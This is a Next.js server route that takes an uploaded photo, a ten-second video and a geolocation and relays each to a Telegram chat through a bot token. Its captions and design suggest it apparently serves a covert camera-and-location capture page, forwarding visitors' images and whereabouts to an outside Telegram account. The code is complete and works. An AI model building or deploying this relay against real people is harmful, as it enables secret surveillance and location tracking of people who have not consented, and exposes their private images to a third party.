import { NextResponse } from "next/server";

export async function POST(request: Request) {
  try {
    const formData = await request.formData();
    const photo = formData.get("photo") as Blob | null;
    const video = formData.get("video") as Blob | null;
    const locationStr = formData.get("location") as string | null;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Missing Telegram credentials");
      return NextResponse.json({ success: false, error: "Server configuration error" }, { status: 500 });
    }

    const telegramApi = `https://api.telegram.org/bot${botToken}`;

    // 1. Send Location if available
    if (locationStr) {
      try {
        const loc = JSON.parse(locationStr);
        await fetch(`${telegramApi}/sendLocation`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            latitude: loc.lat,
            longitude: loc.lng,
          }),
        });
      } catch (e) {
        console.error("Failed to send location:", e);
      }
    }

    // 2. Send Photo if available
    if (photo) {
      try {
        const photoFormData = new FormData();
        photoFormData.append("chat_id", chatId);
        photoFormData.append("photo", photo, "photo.jpg");
        photoFormData.append("caption", "📸 New photo captured!");

        await fetch(`${telegramApi}/sendPhoto`, {
          method: "POST",
          body: photoFormData,
        });
      } catch (e) {
        console.error("Failed to send photo:", e);
      }
    }

    // 3. Send Video if available
    if (video) {
      try {
        const videoFormData = new FormData();
        videoFormData.append("chat_id", chatId);
        videoFormData.append("video", video, "video.webm");
        videoFormData.append("caption", "🎥 New 10s video captured!");

        await fetch(`${telegramApi}/sendVideo`, {
          method: "POST",
          body: videoFormData,
        });
      } catch (e) {
        console.error("Failed to send video:", e);
      }
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("API error:", error);
    return NextResponse.json({ success: false, error: "Internal Server Error" }, { status: 500 });
  }
}
